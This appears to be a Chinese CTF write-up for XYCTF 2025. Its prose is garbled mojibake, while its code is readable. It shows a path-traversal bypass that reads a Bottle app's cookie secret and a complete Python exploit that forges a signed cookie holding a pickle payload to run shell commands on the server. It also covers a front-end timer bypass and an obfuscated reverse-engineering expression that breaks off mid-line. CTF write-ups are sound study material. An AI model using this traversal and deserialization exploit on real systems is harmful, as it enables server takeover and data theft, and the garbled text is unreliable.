class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from bottle import Bottle, request, response, redirect, static_file, run, route</span><br><span class="line">with open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line">@route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="line">@route(&#x27;/download&#x27;)</span><br><span class="line">def download():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\&#x27; in name:</span><br><span class="line">        response.status = 403</span><br><span class="line">        return &#x27;Forbidden&#x27;</span><br><span class="line">    with open(name, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">@route(&#x27;/secret&#x27;)</span><br><span class="line">def secret_page():</span><br><span class="line">    try:</span><br><span class="line">        session = request.get_cookie(&quot;name&quot;, secret=secret)</span><br><span class="line">        if not session or session[&quot;name&quot;] == &quot;guest&quot;:</span><br><span class="line">            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;</span><br><span class="line">            response.set_cookie(&quot;name&quot;, session, secret=secret)</span><br><span class="line">            return &#x27;Forbidden!&#x27;</span><br><span class="line">        if session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line">            return &#x27;The secret has been deleted!&#x27;</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Error!&quot;</span><br><span class="line">run(host=&#x27;0.0.0.0&#x27;, port=8080, debug=False)</span><br></pre></td></tr></table></figure><p>æºç å®¡è®¡ï¼Œå‘ç°æ˜¯ä½¿ç”¨çš„bottemæ¡†æ¶ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨çš„set_cookieæ¥è¿›è¡Œå“åº”åŒ…è®¾ç½®cookieï¼Œä½†æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªsecretã€‚è€Œsecretåœ¨æ–‡ä»¶secret.txté‡Œé¢ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨/downloadè·¯ç”±æ¥è¯»å–ã€‚</p><p>ä¸ºäº†ç»•è¿‡éªŒè¯ï¼Œå¯ä»¥ä½¿ç”¨./â€¦/./â€¦/æ¥å®ç°â€¦/â€¦/çš„æ•ˆæœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?filename=./.././../secret.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406181329616.png" alt="image-20250406181329616"></p><blockquote><p>å¾—åˆ°secret: Hell0_H@cker_Y0u_A3r_Sm@r7</p></blockquote><p>ç„¶åè®¿é—®/secretï¼Œä¹‹åå†å‘é€è¯·æ±‚åŒ…ä¼šæœ‰ä¸€ä¸ªcookie</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406181747018.png" alt="image-20250406181747018"></p><p>ä½¿ç”¨å¾—åˆ°çš„secretè§£å¯†ç„¶åï¼Œå°†nameä¿®æ”¹æˆä¸ºadminï¼Œå†ä½¿ç”¨secretåŠ å¯†æ¥ä¼ªé€ session</p><p>ç›´æ¥ä½¿ç”¨è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">secret = &#x27;Hell0_H@cker_Y0u_A3r_Sm@r7&#x27;</span><br><span class="line">target_url = &#x27;http://eci-2zedg1ipvojx7p46j3ij.cloudeci1.ichunqiu.com:5000/secret&#x27;</span><br><span class="line"></span><br><span class="line">class ReadFlagExploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec, (</span><br><span class="line">            &quot;import subprocess,base64;from bottle import response;&quot;</span><br><span class="line">            &quot;flag=subprocess.check_output(&#x27;ls /&#x27;,shell=True);&quot;</span><br><span class="line">            &quot;response.set_header(&#x27;X-Flag&#x27;,base64.b64encode(flag).decode())&quot;</span><br><span class="line">        ,))</span><br><span class="line"></span><br><span class="line">session_data = &#123;&quot;name&quot;: ReadFlagExploit()&#125;</span><br><span class="line">def create_malicious_cookie(secret, data):</span><br><span class="line">    hmac_algo = hashlib.sha256 </span><br><span class="line">    serialized = pickle.dumps([&quot;name&quot;, data], protocol=0) </span><br><span class="line">    encoded_data = base64.b64encode(serialized).decode()</span><br><span class="line">    signature = hmac.new(secret.encode(), encoded_data.encode(), hmac_algo).digest()</span><br><span class="line">    sig_b64 = base64.b64encode(signature).decode()</span><br><span class="line">    return f&#x27;!&#123;sig_b64&#125;?&#123;encoded_data&#125;&#x27;</span><br><span class="line"></span><br><span class="line">malicious_cookie = create_malicious_cookie(secret, session_data)</span><br><span class="line"></span><br><span class="line">headers = &#123;&#x27;Cookie&#x27;: f&#x27;name=&#123;malicious_cookie&#125;&#x27;&#125;</span><br><span class="line">response = requests.get(target_url, headers=headers)</span><br><span class="line"></span><br><span class="line">if &#x27;X-Flag&#x27; in response.headers:</span><br><span class="line">    flag = base64.b64decode(response.headers[&#x27;X-Flag&#x27;]).decode()</span><br><span class="line">    print(&quot;[+] Flag:&quot;, flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-] ç›´æ¥è¯»å–å¤±è´¥ï¼Œå°è¯•åå‘Shellæˆ–è°ƒæ•´HMACç®—æ³•ã€‚&quot;)</span><br><span class="line">    print(&quot;[*] å“åº”çŠ¶æ€ç :&quot;, response.status_code)</span><br><span class="line">    print(&quot;[*] è¿”å›Cookie:&quot;, response.headers.get(&#x27;Set-Cookie&#x27;, &#x27;&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406182857043.png" alt="image-20250406182857043"></p><p>æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag_dda2d465-af33-4c56-8cc9-fd4306867b70</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406183045456.png" alt="image-20250406183045456"></p><blockquote><p>flag{We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!}</p></blockquote><h3 id="ez-puzzle">ez_puzzle</h3><p>ç”±äºç¯å¢ƒæ— æ³•å¤ç°ï¼Œä»¥ä¸‹ä¸ºå®˜æ–¹wp:</p><p>å‰ç«¯æœ‰F12å’Œâ¿æ ‡å³é”®çš„æ‹¦æˆªï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414112612654.png" alt="image-20250414112612654"></p><p>ç”¨å…¶ä»–æ–¹æ³•æ‰“å¼€æ§åˆ¶å°ï¼Œç„¶åä¼šè§¦å‘ç¨‹åºçš„åè°ƒè¯•ã€‚è¿™â¾¥ç›´æ¥å³é”®ï¼Œç„¶åé€‰æ‹©&quot;å‘å¿½ç•¥åˆ—è¡¨æ·»åŠ è„šæœ¬&quot;ã€‚æ•´ä¸ªç¨‹åºå°±ä¸ä¼šåœâ½Œäº†ï¼Œä½†æ˜¯è¿™æ ·æˆ‘ä»¬ä¹Ÿä¸èƒ½è°ƒè¯•äº†ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414112704268.png" alt="image-20250414112704268"></p><p>ç„¶åå› ä¸ºè¿™é“é¢˜è¯´ä¸¤ç§’ä¹‹å†…å®Œæˆæ‹¼å›¾ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯æœ‰æ—¶é—´å·®çš„ã€‚æˆ‘ä»¬å…¨å±€æœtimeå‘ç°äº†endTimeå’ŒstartTimeä¸¤ä¸ªå˜é‡ï¼Œé‚£ä¹ˆå°±çŒœæµ‹ç¨‹åºä¼šåœ¨æ‹¼å›¾å®ŒæˆåæŠŠä¸¤ä¸ªå˜é‡ä½œå·®ï¼Œç„¶åä¸2000åšâ½è¾ƒï¼Œè™½ç„¶endTimeæˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†æ˜¯å¯ä»¥æŠŠstartTimeæ”¹çš„å¾ˆâ¼¤ï¼Œç„¶åä½œå·®ä¸ºè´Ÿæ•°ï¼Œä¹Ÿæ˜¯â¼©äº2000çš„ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414112748364.png" alt="image-20250414112748364"></p><p>ç„¶åå®Œæˆæ‹¼å›¾å³å¯ã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414112812505.png" alt="image-20250414112812505"></p><h2 id="re">re</h2><h3 id="WARMUP">WARMUP</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406194036827.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°chr()ä¸­æœ‰ä¸€å †ç®—æœ¯å¼å­ï¼Œå…ˆå†™è„šæœ¬å°†å…¶è·‘å‡ºæ¥ã€‚æ¨¡ä¸€ä¸ª1114112ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc1=chr(int((667205//8665)% 1114112))+chr(int((-7671+7786)% 1114112))+chr(int((8541-8438)% 1114112))+chr(int((422928//6408)% 1114112))+chr(int((-1948+2059)% 1114112))+chr(int((-3066+3186)% 1114112))+chr(int((756-724)% 1114112))+chr(int((4080//120)% 1114112))+chr(int((-3615+3683)% 1114112))+chr(int((-1619+1720)% 1114112))+chr(int((-2679+2776)% 1114112))+chr(int((659718//5787)% 1114112))+chr(int((302752//9461)% 1114112))+chr(int((-6627+6694)% 1114112))+chr(int((-4261+4345)% 1114112))+chr(int((81690//1167)% 1114112))+chr(int((636180//9220)% 1114112))+chr(int((538658//6569)% 1114112))+chr(int((-1542+1588)% 1114112))+chr(int((-1644+1676)% 1114112))+chr(int((122184//1697)% 1114112))+chr(int((966411//9963)% 1114112))+chr(int((2186-2068)% 1114112))+chr(int((-5283+5384)% 1114112))+chr(int((305056//9533)% 1114112))+chr(int((66402//651)% 1114112))+chr(int((1141452//9756)% 1114112))+chr(int((882090//8019)% 1114112))+chr(int((-4243+4275)% 1114112))+chr(int((2669-2564)% 1114112))+chr(int((83+27)% 1114112))+chr(int((254880//7965)% 1114112))+chr(int((-1291+1379)% 1114112))+chr(int((-4699+4788)% 1114112))+chr(int((4730-4663)% 1114112))+chr(int((-1179+1263)% 1114112))+chr(int((5274-5204)% 1114112))+chr(int((210144//6567)% 1114112))+chr(int((-6803+6853)% 1114112))+chr(int((6655-6607)% 1114112))+chr(int((4067-4017)% 1114112))+chr(int((121900//2300)% 1114112))+chr(int((-6158+6191)% 1114112))+chr(int((11934//351)% 1114112))+chr(int((64883//4991)% 1114112))+chr(int((65420//6542)% 1114112))+chr(int((3781-3679)% 1114112))+chr(int((1612-1504)% 1114112))+chr(int((892788//9204)% 1114112))+chr(int((927618//9006)% 1114112))+chr(int((-6692+6724)% 1114112))+chr(int((410591//6731)% 1114112))+chr(int((6675-6643)% 1114112))+chr(int((697880//9560)% 1114112))+chr(int((4250-4140)% 1114112))+chr(int((5464-5352)% 1114112))+chr(int((-1082+1199)% 1114112))+chr(int((3343-3227)% 1114112))+chr(int((1211-1145)% 1114112))+chr(int((482406//4346)% 1114112))+chr(int((-5549+5669)% 1114112))+chr(int((-5150+5190)% 1114112))+chr(int((4400-4366)% 1114112))+chr(int((-3277+3346)% 1114112))+chr(int((-6649+6759)% 1114112))+chr(int((-5669+5785)% 1114112))+chr(int((-6734+6835)% 1114112))+chr(int((9757-9643)% 1114112))+chr(int((109-77)% 1114112))+chr(int((5620-5504)% 1114112))+chr(int((-2887+2991)% 1114112))+chr(int((-3081+3182)% 1114112))+chr(int((-5109+5141)% 1114112))+chr(int((699860//9998)% 1114112))+chr(int((-3603+3679)% 1114112))+chr(int((1631-1566)% 1114112))+chr(int((445-374)% 1114112))+chr(int((294118//5071)% 1114112))+chr(int((-1115+1149)% 1114112))+chr(int((222376//5054)% 1114112))+chr(int((8137-8105)% 1114112))+chr(int((-1653+1687)% 1114112))+chr(int((357104//4058)% 1114112))+chr(int((1650-1561)% 1114112))+chr(int((-9501+9568)% 1114112))+chr(int((1047-963)% 1114112))+chr(int((2540-2470)% 1114112))+chr(int((1692-1658)% 1114112))+chr(int((9947-9906)% 1114112))+chr(int((9186-9173)% 1114112))+chr(int((-2846+2856)% 1114112))+chr(int((425187//3573)% 1114112))+chr(int((-3066+3167)% 1114112))+chr(int((2850-2748)% 1114112))+chr(int((-2992+3090)% 1114112))+chr(int((958230//8190)% 1114112))+chr(int((869295//7305)% 1114112))+chr(int((3380-3275)% 1114112))+chr(int((-7338+7455)% 1114112))+chr(int((408848//4048)% 1114112))+chr(int((9211-9179)% 1114112))+chr(int((-2437+2498)% 1114112))+chr(int((1672-1640)% 1114112))+chr(int((2378-2344)% 1114112))+chr(int((544749//9557)% 1114112))+chr(int((351120//7315)% 1114112))+chr(int((773800//7738)% 1114112))+chr(int((2033-1931)% 1114112))+chr(int((-8059+8111)% 1114112))+chr(int((-4731+4783)% 1114112))+chr(int((-9204+9252)% 1114112))+chr(int((-4261+4316)% 1114112))+chr(int((850521//8421)% 1114112))+chr(int((-7011+7112)% 1114112))+chr(int((292272//6089)% 1114112))+chr(int((-8609+8666)% 1114112))+chr(int((-2921+2972)% 1114112))+chr(int((6772-6672)% 1114112))+chr(int((487611//9561)% 1114112))+chr(int((-6754+6802)% 1114112))+chr(int((464835//8155)% 1114112))+chr(int((-939+987)% 1114112))+chr(int((421173//7389)% 1114112))+chr(int((-8145+8201)% 1114112))+chr(int((9368-9268)% 1114112))+chr(int((-7682+7738)% 1114112))+chr(int((-8646+8699)% 1114112))+chr(int((484612//4996)% 1114112))+chr(int((286832//5516)% 1114112))+chr(int((-9710+9760)% 1114112))+chr(int((884156//9022)% 1114112))+chr(int((7080-6979)% 1114112))+chr(int((265477//5009)% 1114112))+chr(int((6+49)% 1114112))+chr(int((5395-5298)% 1114112))+chr(int((6645-6595)% 1114112))+chr(int((-9706+9763)% 1114112))+chr(int((-6697+6752)% 1114112))+chr(int((927-870)% 1114112))+chr(int((4048-3946)% 1114112))+chr(int((34398//702)% 1114112))+chr(int((825675//8175)% 1114112))+chr(int((-438+491)% 1114112))+chr(int((87808//1792)% 1114112))+chr(int((-2601+2653)% 1114112))+chr(int((420228//7782)% 1114112))+chr(int((-5266+5317)% 1114112))+chr(int((53059//547)% 1114112))+chr(int((477054//9354)% 1114112))+chr(int((9238-9189)% 1114112))+chr(int((799112//7912)% 1114112))+chr(int((3340-3284)% 1114112))+chr(int((8544-8444)% 1114112))+chr(int((1220-1171)% 1114112))+chr(int((-7192+7245)% 1114112))+chr(int((73629//729)% 1114112))+chr(int((6523-6473)% 1114112))+chr(int((2761-2659)% 1114112))+chr(int((358124//3692)% 1114112))+chr(int((-6167+6266)% 1114112))+chr(int((-3842+3894)% 1114112))+chr(int((7840-7739)% 1114112))+chr(int((-3980+4036)% 1114112))+chr(int((987-935)% 1114112))+chr(int((6868//68)% 1114112))+chr(int((-559+656)% 1114112))+chr(int((6513-6465)% 1114112))+chr(int((843300//8433)% 1114112))+chr(int((-8159+8261)% 1114112))+chr(int((-753+807)% 1114112))+chr(int((278700//5574)% 1114112))+chr(int((5600//112)% 1114112))+chr(int((-549+646)% 1114112))+chr(int((-7697+7750)% 1114112))+chr(int((390292//7364)% 1114112))+chr(int((988020//9980)% 1114112))+chr(int((-3250+3302)% 1114112))+chr(int((6295-6195)% 1114112))+chr(int((4342-4242)% 1114112))+chr(int((-9602+9704)% 1114112))+chr(int((1312-1214)% 1114112))+chr(int((1065-1012)% 1114112))+chr(int((1122//22)% 1114112))+chr(int((191012//3604)% 1114112))+chr(int((330775//3275)% 1114112))+chr(int((226848//2224)% 1114112))+chr(int((4973-4922)% 1114112))+chr(int((369357//3657)% 1114112))+chr(int((-7229+7282)% 1114112))+chr(int((588//12)% 1114112))+chr(int((57570//570)% 1114112))+chr(int((4554-4498)% 1114112))+chr(int((483924//4938)% 1114112))+chr(int((485600//9712)% 1114112))+chr(int((5051-4998)% 1114112))+chr(int((8467-8417)% 1114112))+chr(int((-6799+6855)% 1114112))+chr(int((668360//6820)% 1114112))+chr(int((428008//7643)% 1114112))+chr(int((-309+359)% 1114112))+chr(int((-7495+7549)% 1114112))+chr(int((198200//1982)% 1114112))+chr(int((-4298+4351)% 1114112))+chr(int((2979-2928)% 1114112))+chr(int((-391+443)% 1114112))+chr(int((-5951+6006)% 1114112))+chr(int((-2271+2372)% 1114112))+chr(int((1431-1382)% 1114112))+chr(int((-2812+2866)% 1114112))+chr(int((4906-4853)% 1114112))+chr(int((-5308+5365)% 1114112))+chr(int((-8587+8636)% 1114112))+chr(int((-1003+1053)% 1114112))+chr(int((468741//4641)% 1114112))+chr(int((8449-8392)% 1114112))+chr(int((14877//261)% 1114112))+chr(int((-5097+5146)% 1114112))+chr(int((6695-6646)% 1114112))+chr(int((-2866+2922)% 1114112))+chr(int((483786//9486)% 1114112))+chr(int((-4142+4193)% 1114112))+chr(int((2347-2296)% 1114112))+chr(int((-1784+1833)% 1114112))+chr(int((116229//2193)% 1114112))+chr(int((-1099+1148)% 1114112))+chr(int((8230-8180)% 1114112))+chr(int((-4351+4406)% 1114112))+chr(int((1975-1924)% 1114112))+chr(int((779229//7871)% 1114112))+chr(int((102960//1040)% 1114112))+chr(int((67830//1330)% 1114112))+chr(int((-4771+4873)% 1114112))+chr(int((-32+129)% 1114112))+chr(int((155456//2776)% 1114112))+chr(int((9798-9700)% 1114112))+chr(int((4944-4894)% 1114112))+chr(int((-2496+2594)% 1114112))+chr(int((5495-5444)% 1114112))+chr(int((8113-8015)% 1114112))+chr(int((-8444+8496)% 1114112))+chr(int((3896-3847)% 1114112))+chr(int((6306-6255)% 1114112))+chr(int((1284-1185)% 1114112))+chr(int((1003986//9843)% 1114112))+chr(int((-1321+1371)% 1114112))+chr(int((2676-2578)% 1114112))+chr(int((-5421+5521)% 1114112))+chr(int((564186//5757)% 1114112))+chr(int((6608-6559)% 1114112))+chr(int((7038-6937)% 1114112))+chr(int((209720//3745)% 1114112))+chr(int((-616+715)% 1114112))+chr(int((9766-9709)% 1114112))+chr(int((2111-2012)% 1114112))+chr(int((528993//9981)% 1114112))+chr(int((1901-1851)% 1114112))+chr(int((281344//5024)% 1114112))+chr(int((5695-5641)% 1114112))+chr(int((4815-4762)% 1114112))+chr(int((399556//3956)% 1114112))+chr(int((572730//5615)% 1114112))+chr(int((-5718+5817)% 1114112))+chr(int((21+27)% 1114112))+chr(int((4532-4475)% 1114112))+chr(int((-8446+8499)% 1114112))+chr(int((5786-5689)% 1114112))+chr(int((4177-4121)% 1114112))+chr(int((-8411+8511)% 1114112))+chr(int((-9499+9599)% 1114112))+chr(int((479528//8563)% 1114112))+chr(int((6850-6793)% 1114112))+chr(int((-3725+3823)% 1114112))+chr(int((-8692+8743)% 1114112))+chr(int((284298//2901)% 1114112))+chr(int((214302//4202)% 1114112))+chr(int((576675//5825)% 1114112))+chr(int((-4565+4667)% 1114112))+chr(int((-7223+7321)% 1114112))+chr(int((383278//3911)% 1114112))+chr(int((-2540+2590)% 1114112))+chr(int((35+13)% 1114112))+chr(int((-5549+5597)% 1114112))+chr(int((969122//9889)% 1114112))+chr(int((964712//9844)% 1114112))+chr(int((-6231+6328)% 1114112))+chr(int((-1560+1660)% 1114112))+chr(int((-7416+7514)% 1114112))+chr(int((609144//5972)% 1114112))+chr(int((471432//9066)% 1114112))+chr(int((-4500+4597)% 1114112))+chr(int((8620-8566)% 1114112))+chr(int((7113-7014)% 1114112))+chr(int((-2488+2588)% 1114112))+chr(int((-3599+3651)% 1114112))+chr(int((211956//6234)% 1114112))+chr(int((1697-1665)% 1114112))+chr(int((-5122+5161)% 1114112))+chr(int((-3189+3221)% 1114112))+chr(int((-5840+114)% 1114112))+chr(int((-37790+6278)% 1114112))+chr(int((-8.231351E+07//3957)% 1114112))+chr(int((-14110+7864)% 1114112))+chr(int((-30457-1205)% 1114112))+chr(int((9930-9863)% 1114112))+chr(int((107-55)% 1114112))+chr(int((517-7291)% 1114112))+chr(int((-31263+6916)% 1114112))+chr(int((-29685+9083)% 1114112))+chr(int((-2.138515E+07//3442)% 1114112))+chr(int((-26304-1370)% 1114112))+chr(int((-1.510879E+08//6060)% 1114112))+chr(int((-903-3261)% 1114112))+chr(int((-22484-8007)% 1114112))+chr(int((-34437+5126)% 1114112))+chr(int((-10635+3856)% 1114112))+chr(int((-1.97004E+08//9374)% 1114112))+chr(int((-1.079768E+08//6550)% 1114112))+chr(int((-2.533546E+07//3739)% 1114112))+chr(int((-25645+6931)% 1114112))+chr(int((-1.720817E+08//7056)% 1114112))+chr(int((-12498+5774)% 1114112))+chr(int((-2.164872E+08//7546)% 1114112))+chr(int((-8955-8316)% 1114112))+chr(int((-3584+3597)% 1114112))+chr(int((-1280+1290)% 1114112))+chr(int((795633//7041)% 1114112))+chr(int((291669//2451)% 1114112))+chr(int((9044-8942)% 1114112))+chr(int((264014//2614)% 1114112))+chr(int((-7841+7873)% 1114112))+chr(int((10919//179)% 1114112))+chr(int((22272//696)% 1114112))+chr(int((-8135+8169)% 1114112))+chr(int((-5733+5847)% 1114112))+chr(int((371547//3753)% 1114112))+chr(int((473980//9115)% 1114112))+chr(int((391-284)% 1114112))+chr(int((-1824+1925)% 1114112))+chr(int((-1707+1828)% 1114112))+chr(int((2151-2117)% 1114112))+chr(int((2535//195)% 1114112))+chr(int((7236-7226)% 1114112))+chr(int((58097//4469)% 1114112))+chr(int((2710//271)% 1114112))+chr(int((118677//3043)% 1114112))+chr(int((-7992+8024)% 1114112))+chr(int((-5.682766E+07//8145)% 1114112))+chr(int((-3.747722E+07//1805)% 1114112))+chr(int((-20535-2876)% 1114112))+chr(int((-5076000//750)% 1114112))+chr(int((-28220-733)% 1114112))+chr(int((-33583+7603)% 1114112))+chr(int((7730-7648)% 1114112))+chr(int((7057-6990)% 1114112))+chr(int((338728//6514)% 1114112))+chr(int((-4.203267E+07//6205)% 1114112))+chr(int((-20128-4219)% 1114112))+chr(int((-29090+8488)% 1114112))+chr(int((-7954+1177)% 1114112))+chr(int((-25730+8808)% 1114112))+chr(int((-23859-3357)% 1114112))+chr(int((-2130+2143)% 1114112))+chr(int((6827-6817)% 1114112))+chr(int((4334-4264)% 1114112))+chr(int((4851-4734)% 1114112))+chr(int((5121-5011)% 1114112))+chr(int((7034-6935)% 1114112))+chr(int((4197-4081)% 1114112))+chr(int((-1823+1928)% 1114112))+chr(int((1032744//9304)% 1114112))+chr(int((1547-1437)% 1114112))+chr(int((-7393+7425)% 1114112))+chr(int((608932//7426)% 1114112))+chr(int((864513//7389)% 1114112))+chr(int((1748-1638)% 1114112))+chr(int((501676//6118)% 1114112))+chr(int((510473//7619)% 1114112))+chr(int((-6752+6792)% 1114112))+chr(int((-5142+5257)% 1114112))+chr(int((-9558+9635)% 1114112))+chr(int((7906-7805)% 1114112))+chr(int((5308-5193)% 1114112))+chr(int((163300//1420)% 1114112))+chr(int((10961//113)% 1114112))+chr(int((740364//7188)% 1114112))+chr(int((-5327+5428)% 1114112))+chr(int((5703-5659)% 1114112))+chr(int((-7307+7339)% 1114112))+chr(int((445970//3878)% 1114112))+chr(int((608-492)% 1114112))+chr(int((-4799+4913)% 1114112))+chr(int((-3687+3762)% 1114112))+chr(int((9993-9892)% 1114112))+chr(int((1032493//8533)% 1114112))+chr(int((103607//2527)% 1114112))+chr(int((123266//9482)% 1114112))+chr(int((61520//6152)% 1114112))+chr(int((251424//7857)% 1114112))+chr(int((104032//3251)% 1114112))+chr(int((-7228+7260)% 1114112))+chr(int((239648//7489)% 1114112))+chr(int((-1858+1926)% 1114112))+chr(int((865515//8243)% 1114112))+chr(int((818481//7509)% 1114112))+chr(int((244384//7637)% 1114112))+chr(int((-4252+4359)% 1114112))+chr(int((10+66)% 1114112))+chr(int((-3202+3303)% 1114112))+chr(int((466070//4237)% 1114112))+chr(int((3973-3929)% 1114112))+chr(int((-7658+7690)% 1114112))+chr(int((563430//5366)% 1114112))+chr(int((168872//3838)% 1114112))+chr(int((306144//9567)% 1114112))+chr(int((158046//1491)% 1114112))+chr(int((311740//7085)% 1114112))+chr(int((-6862+6894)% 1114112))+chr(int((621760//5360)% 1114112))+chr(int((-8151+8252)% 1114112))+chr(int((9608-9499)% 1114112))+chr(int((309680//2765)% 1114112))+chr(int((244288//5552)% 1114112))+chr(int((6191-6159)% 1114112))+chr(int((705936//6303)% 1114112))+chr(int((4828-4717)% 1114112))+chr(int((1097330//9542)% 1114112))+chr(int((431596//9809)% 1114112))+chr(int((-8819+8851)% 1114112))+chr(int((546675//4925)% 1114112))+chr(int((805545//6885)% 1114112))+chr(int((-5087+5203)% 1114112))+chr(int((1223-1151)% 1114112))+chr(int((9566-9465)% 1114112))+chr(int((2413-2293)% 1114112))+chr(int((4760-4747)% 1114112))+chr(int((-4859+4869)% 1114112))+chr(int((3357-3325)% 1114112))+chr(int((667-635)% 1114112))+chr(int((-2223+2255)% 1114112))+chr(int((4357-4325)% 1114112))+chr(int((366928//5396)% 1114112))+chr(int((203175//1935)% 1114112))+chr(int((-7837+7946)% 1114112))+chr(int((47936//1498)% 1114112))+chr(int((3589-3474)% 1114112))+chr(int((254920//6373)% 1114112))+chr(int((3498-3448)% 1114112))+chr(int((54113//1021)% 1114112))+chr(int((9319-9266)% 1114112))+chr(int((380767//9287)% 1114112))+chr(int((298804//6791)% 1114112))+chr(int((-5151+5183)% 1114112))+chr(int((3487-3380)% 1114112))+chr(int((246760//6169)% 1114112))+chr(int((7465-7415)% 1114112))+chr(int((-8879+8932)% 1114112))+chr(int((-281+334)% 1114112))+chr(int((314470//7670)% 1114112))+chr(int((-1151+1164)% 1114112))+chr(int((4880-4870)% 1114112))+chr(int((3582-3550)% 1114112))+chr(int((147008//4594)% 1114112))+chr(int((169248//5289)% 1114112))+chr(int((-8224+8256)% 1114112))+chr(int((4654//358)% 1114112))+chr(int((-2894+2904)% 1114112))+chr(int((3479-3447)% 1114112))+chr(int((2036-2004)% 1114112))+chr(int((7024-6992)% 1114112))+chr(int((-8686+8718)% 1114112))+chr(int((-664+703)% 1114112))+chr(int((53952//1686)% 1114112))+chr(int((-10371+3595)% 1114112))+chr(int((-21805-3310)% 1114112))+chr(int((-1.930486E+08//8525)% 1114112))+chr(int((-6242-530)% 1114112))+chr(int((-2.479211E+08//9214)% 1114112))+chr(int((-28712+8110)% 1114112))+chr(int((4047-9789)% 1114112))+chr(int((278397//4419)% 1114112))+chr(int((-6794+6804)% 1114112))+chr(int((310624//9707)% 1114112))+chr(int((120896//3778)% 1114112))+chr(int((6925-6893)% 1114112))+chr(int((8256-8224)% 1114112))+chr(int((-4736+4843)% 1114112))+chr(int((1256-1180)% 1114112))+chr(int((4250-4149)% 1114112))+chr(int((-9132+9242)% 1114112))+chr(int((173344//5417)% 1114112))+chr(int((-9030+9091)% 1114112))+chr(int((72-40)% 1114112))+chr(int((344204//4529)% 1114112))+chr(int((351985//3485)% 1114112))+chr(int((6120-6010)% 1114112))+chr(int((1113-1073)% 1114112))+chr(int((2781-2666)% 1114112))+chr(int((6375-6259)% 1114112))+chr(int((780330//6845)% 1114112))+chr(int((106050//1414)% 1114112))+chr(int((1239-1138)% 1114112))+chr(int((-986+1107)% 1114112))+chr(int((324351//7911)% 1114112))+chr(int((-7872+7885)% 1114112))+chr(int((-1326+1336)% 1114112))+chr(int((17728//554)% 1114112))+chr(int((61600//1925)% 1114112))+chr(int((-4930+4962)% 1114112))+chr(int((113856//3558)% 1114112))+chr(int((-7210+7280)% 1114112))+chr(int((3126-3015)% 1114112))+chr(int((9894-9780)% 1114112))+chr(int((2040-2008)% 1114112))+chr(int((957810//9122)% 1114112))+chr(int((-1680+1712)% 1114112))+chr(int((-7068+7129)% 